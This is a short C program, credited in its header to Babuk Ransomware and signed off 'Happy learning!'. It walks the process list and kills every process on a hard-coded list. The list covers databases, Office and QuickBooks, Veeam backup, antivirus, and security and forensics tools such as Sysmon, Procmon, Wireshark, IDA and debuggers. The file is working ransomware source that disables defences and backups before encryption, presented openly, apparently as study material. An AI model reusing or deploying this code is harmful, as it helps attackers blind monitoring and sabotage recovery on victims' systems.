/*
 * ╓──────────────────────────────────────────────────────────────────────────────────────╖
 * ╟──────────────────────────────────────────────────────────────────────────────────────╢
 * ║                                                                                      ║
 * ║   Description: Terminate a list of processess in once                                ║
   ║   Credits: Babuk Ransomware                                                          ║
   ║                                                                                      ║
 * ║                                                                                      ║
   ║   Happy learning!                                                                    ║
 * ║                                                                                      ║
 * ║                                                                                      ║
 * ║																				                                              ║                    
 * ║                                                                                      ║
 * ╙──────────────────────────────────────────────────────────────────────────────────────╜
 */


#include <windows.h>
#include <tlhelp32.h>
#include <restartManager.h>
#include <wbemprov.h>
#include <iphlpapi.h>
#include <icmpapi.h>
#include <lm.h>

static const WCHAR* processes_to_stop[] = { L"notepad.exe", L"sqlmangr.exe", L"supervise.exe", L"Defwatch.exe", L"winword.exe", L"QBW32.exe", L"QBDBMgr.exe", L"qbupdate.exe", L"axlbridge.exe", L"httpd.exe", L"fdlauncher.exe", L"MsDtSrvr.exe", L"java.exe", L"360se.exe", L"360doctor.exe", L"wdswfsafe.exe", L"fdhost.exe", L"dbeng50.exe", L"GDscan.exe", L"vxmon.exe", L"vsnapvss.exe", L"CagService.exe", L"DellSystemDetect.exe", L"ProcessHacker.exe", L"Procexp64.exe", L"Procexp.exe", L"WireShark.exe", L"dumpcap.exe", L"Autoruns.exe", L"Autoruns64.exe", L"Autoruns64a.exe", L"Autorunsc.exe", L"Autorunsc64.exe", L"Sysmon.exe", L"Sysmon64.exe", L"procexp64a.exe", L"procmon.exe", L"procmon64.exe",L"procmon64a.exe",L"ADExplorer.exe", L"ADExplorer64.exe", L"ADExplorer64a.exe", L"tcpview.exe", L"tcpview64.exe", L"tcpview64a.exe", L"VeeamDeploymentSvc.exe", L"windbg.exe", L"tttracer.exe", L"cdb.exe", L"cdb64.exe", L"ida64.exe", L"OllyDbg.exe", L"bintext.exe", L"TTTracerElevated.exe", L"TTDInject.exe", L"pestudio.exe", L"capa-v1.0.0-win.exe", L"netmon.exe", L"Fiddler.exe" };

VOID StopProcesses() {
    HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, 0);
    PROCESSENTRY32W pEntry;
    pEntry.dwSize = sizeof(pEntry);
    BOOL hRes = Process32FirstW(hSnapShot, &pEntry);
    while (hRes)
    {
        for (int i = 0; i < _countof(processes_to_stop); i++) {
            if (lstrcmpW(processes_to_stop[i], pEntry.szExeFile) == 0) {
                HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, 0, (DWORD)pEntry.th32ProcessID);
                if (hProcess != NULL)
                {
                    TerminateProcess(hProcess, 9);
                    CloseHandle(hProcess);
                }
                break;
            }
        }
        hRes = Process32NextW(hSnapShot, &pEntry);
    }
    CloseHandle(hSnapShot);
}

int main()
{
    StopProcesses();
}
